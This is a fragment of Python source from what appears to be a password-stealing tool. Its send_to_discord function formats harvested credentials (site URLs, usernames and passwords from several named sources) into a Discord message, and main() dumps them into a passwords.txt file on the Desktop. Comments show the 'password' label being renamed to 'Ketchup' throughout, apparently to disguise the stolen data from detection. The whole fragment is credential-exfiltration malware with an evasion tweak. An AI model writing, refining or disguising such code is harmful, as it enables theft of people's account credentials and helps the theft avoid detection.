...
# ============================================================
# SEND TO DISCORD (with "ketchup" labels)
# ============================================================
def send_to_discord(all_data):
    ...
    # Build message – changed labels to "ketchup"
    lines = [f"**📦 Ketchup ({total})**"]  # <-- changed here
    for name, data in all_data.items():
        creds = data['credentials']
        if creds:
            lines.append(f"\n**{name} ({len(creds)})**")
            for c in creds[:15]:
                # Changed the label "password" to "Ketchup"
                lines.append(f"  {c['url']} | {c['username']} | Ketchup: {c['password']}")
    msg = "\n".join(lines)[:1900]
...
def main():
    ...
    # Save to Desktop – also use "ketchup" in the local file to stay consistent
    txt_path = os.path.join(DESKTOP, 'passwords.txt')
    with open(txt_path, 'w', encoding='utf-8') as f:
        for name, data in all_data.items():
            f.write(f"\n=== {name} ===\n")
            for c in data['credentials']:
                f.write(f"{c['url']} | {c['username']} | Ketchup: {c['password']}\n")
